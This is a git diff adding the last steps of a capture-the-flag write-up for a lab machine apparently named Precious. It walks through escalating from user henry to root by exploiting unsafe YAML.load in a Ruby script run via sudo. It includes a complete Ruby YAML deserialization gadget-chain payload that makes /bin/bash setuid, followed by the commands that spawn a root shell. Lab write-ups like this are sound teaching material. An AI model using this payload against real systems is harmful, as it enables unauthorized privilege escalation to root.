@@ -45,3 +45,43 @@ here is the flag for henry:
 
 ![obraz](https://github.com/Anogota/Precious-/assets/143951834/22e16674-d01a-46f2-bf59-8e961f1ac625)
 
+7.Which command can henry run with sudo, without providing a password?
+Whe can check this with help command sudo -l, there we can find what kind of command can run henry with sudo.
+
+8.Which is the name of the file that allows for user-controlled input to the update_dependencies.rb script?
+We need to analaz the code, there we can find this script:
+
+![obraz](https://github.com/Anogota/Precious-/assets/143951834/e12dd19a-28e8-4bf1-a101-476b4b02559e)
+
+def list_from_file
+    YAML.load(File.read("dependencies.yml"))
+here we can see this file that allows for user-controlled, let's go into this file, we can find this file in /opt/sample
+
+9.Submit the flag located in root's home directory.
+First what we need to do is go to /dev/shm and create this file dependencies.yml, than with help vim or nano you must insert this:
+
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: "chmod +s /bin/bash"
+         method_id: :resolve
+
+Than write this: sudo /usr/bin/ruby /opt/update_dependencies.rb
+ls -al /bin/bash
+/bin/bash -p
+And we will get a root: ![obraz](https://github.com/Anogota/Precious-/assets/143951834/5e66c764-2d21-4ea0-a4e6-618239c83381)
+
